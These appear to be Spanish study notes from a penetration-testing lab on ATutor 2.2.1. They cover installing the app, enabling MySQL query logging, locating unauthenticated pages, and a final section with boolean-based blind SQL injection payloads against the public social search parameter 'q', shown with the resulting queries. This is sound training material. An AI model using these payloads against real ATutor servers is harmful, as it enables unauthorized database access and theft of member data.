### Configuracion Atutor 2.2.1
- Descarga [https://sourceforge.net/projects/atutor/files/atutor_2_2_1/](https://sourceforge.net/projects/atutor/files/atutor_2_2_1/)

- POC: http://192.168.100.28/atutor/mods/_standard/social/index_public.php?q='

- Instalación

```
OS:  Ubuntu 14.04.6 LTS
mysql  atutor:atutor
PHP 5.5.9-1ubuntu4

[X] mysql
add (php.ini)
extensión=mysqli
extensión=pdo_mysql
restart apache2

[WARNING]
sudo apt-get install php5-gd
sudo apt-get install php5-curl
restart apache2

CONFIGURACION (FILE UPLOAD)
/var/www/html/atutor/include/classes/pclzip.lib.php
REEMPLAZAR
[gzopen]  -> [gzopen64]
[@gzopen] -> [@gzopen64]
```


----

#### Configurando el entorno MYSQL LOG
```
student@atutor:~$ sudo nano /etc/mysql/my.cnf <> /etc/mysql/mariadb.conf.d/50-server.cnf
[mysqld]
general_log_file = /var/log/mysql/mysql.log 
general_log = 1

student@atutor:~$ sudo systemctl restart mysql

sudo tail –f /var/log/mysql/mysql.log
```

Añadir al archivo ```/etc/php5/apache2/php.ini```
```
[...]
display_errors = On 
[...]
```

Reinicar apache
```
student@atutor:~$ sudo systemctl restart apache2
```

----

Todas las páginas que no requieren autenticación contienen la siguiente línea en su código fuente  
```
$_user_location = 'public'; 
```

Enumerar todas las páginas a las que podíamos acceder sin autenticación  
```
grep -rnw /var/www/html/ATutor -e "^.*user_location.*public.*" -color
```

Después de pasar un tiempo haciéndolo, descubrimos un hallazgo potencialmente interesante. Miremos el código encontrado en ```/var/www/html/ATutor/mods/_standard/social/index_public.php``` 
```
14: $_user_location = 'public'; 15: 
16: define('AT_INCLUDE_PATH', '../../../include/'); 
17: require(AT_INCLUDE_PATH.'vitals.inc.php'); 
18: require_once(AT_SOCIAL_INCLUDE.'constants.inc.php'); 
19: require(AT_SOCIAL_INCLUDE.'friends.inc.php'); 
20: require(AT_SOCIAL_INCLUDE.'classes/PrivacyControl/PrivacyObject.class.php'); 
21: require(AT_SOCIAL_INCLUDE.'classes/PrivacyControl/PrivacyController.class.php'); 
```

 ```
 grep -rnw /var/www/html/ATutor -e "function searchFriends" --color
 ```

## PHP
- `isset`: Si tiene valor devuelve un **true**  
- `intval`: Obtiene el valor entero de una variable  
- `àddslashes`: Devuelve una cadena con barras invertidas añadidas antes de los caracteres que deben escaparse (',",\,NUL)  
- `continue`:se utiliza dentro de las estructuras iterativas para saltar el resto de la iteración actual del bucle y continuar la ejecución en la evaluación de la condición, para luego comenzar la siguiente iteración.

-----
## Exfiltracion de datos
```
> select/**/1;
> AAAA')/**/or/**/(select/**/1)=1%23 
> AAAA')/**/or/**/(select/**/1)=0%23
>  SELECT count(*) FROM AT_members M WHERE (first_name LIKE 
'%AAAA')/**/or/**/(select/**/1)=1#%' OR second_name LIKE 
'%AAAA')/**/or/**/(select/**/1)=1#%' OR last_name LIKE 
'%AAAA')/**/or/**/(select/**/1)=1#%' OR login LIKE 
'%AAAA')/**/or/**/(select/**/1)=1#%');\n;
>  SELECT count(*) FROM AT_members M WHERE (first_name LIKE 
'%AAAA')/**/or/**/(select/**/1)=0#%' OR second_name LIKE 
'%AAAA')/**/or/**/(select/**/1)=0#%' OR last_name LIKE 
'%AAAA')/**/or/**/(select/**/1)=0#%' OR login LIKE 
'%AAAA')/**/or/**/(select/**/1)=0#%');\n;
```


